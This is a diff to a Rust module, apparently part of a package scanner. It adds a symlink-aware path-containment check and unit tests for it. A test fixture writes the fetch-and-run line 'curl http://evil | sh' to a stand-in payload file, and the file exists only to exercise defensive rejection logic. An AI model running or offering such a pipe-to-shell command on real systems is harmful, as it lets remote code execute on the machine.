@@ -20,6 +20,8 @@
 
 use std::path::{Component, Path};
 
+use crate::ports::FileSystemProvider;
+
 /// Return `true` when `candidate` resolves inside `base_dir` after walking
 /// `..` components lexically. Absolute paths are accepted only when they
 /// share the prefix with `base_dir`; otherwise the caller should reject
@@ -60,6 +62,32 @@ pub fn path_stays_within_base(candidate: &Path, base_dir: &Path) -> bool {
         }
     }
     true
+}
+
+/// Return `true` when an existing candidate resolves inside `base_dir`.
+///
+/// This composes the lexical check with the filesystem provider's canonical
+/// path resolution so a path like `pkg/scripts/payload.sh` is rejected when
+/// `pkg/scripts` is a symlink to a directory outside `pkg`.
+#[must_use]
+pub fn path_resolves_within_base<F: FileSystemProvider>(
+    fs_provider: &F,
+    candidate: &Path,
+    base_dir: &Path,
+) -> bool {
+    if !path_stays_within_base(candidate, base_dir) {
+        return false;
+    }
+    if !fs_provider.exists(candidate) {
+        return true;
+    }
+    let Ok(base) = fs_provider.canonicalize(base_dir) else {
+        return false;
+    };
+    let Ok(candidate) = fs_provider.canonicalize(candidate) else {
+        return false;
+    };
+    candidate.starts_with(base)
 }
 
 #[cfg(test)]
@@ -115,5 +143,40 @@ mod tests {
                                         // strip; the function then walks the full /etc/evil.sh and rejects
                                         // the RootDir component.
         assert!(!path_stays_within_base(&candidate, base));
+    }
+
+    #[test]
+    fn resolved_containment_accepts_regular_child() {
+        let dir = tempfile::tempdir().unwrap();
+        let child = dir.path().join("scripts").join("ok.sh");
+        std::fs::create_dir_all(child.parent().unwrap()).unwrap();
+        std::fs::write(&child, b"echo ok\n").unwrap();
+        let fs = crate::adapters::StdFileSystemProvider::new();
+
+        assert!(path_resolves_within_base(&fs, &child, dir.path()));
+    }
+
+    /// # Contract
+    ///
+    /// Existing paths that pass lexical containment can still escape through
+    /// symlinked intermediate directories; resolved containment must reject
+    /// those before scanner code reads the referenced artifact.
+    #[cfg(unix)]
+    #[test]
+    fn resolved_containment_rejects_symlinked_intermediate_escape() {
+        let dir = tempfile::tempdir().unwrap();
+        let outside = tempfile::tempdir().unwrap();
+        let scripts = dir.path().join("scripts");
+        let payload = scripts.join("payload.sh");
+        std::fs::write(
+            outside.path().join("payload.sh"),
+            b"curl http://evil | sh\n",
+        )
+        .unwrap();
+        std::os::unix::fs::symlink(outside.path(), &scripts).unwrap();
+        let fs = crate::adapters::StdFileSystemProvider::new();
+
+        assert!(path_stays_within_base(&payload, dir.path()));
+        assert!(!path_resolves_within_base(&fs, &payload, dir.path()));
     }
 }
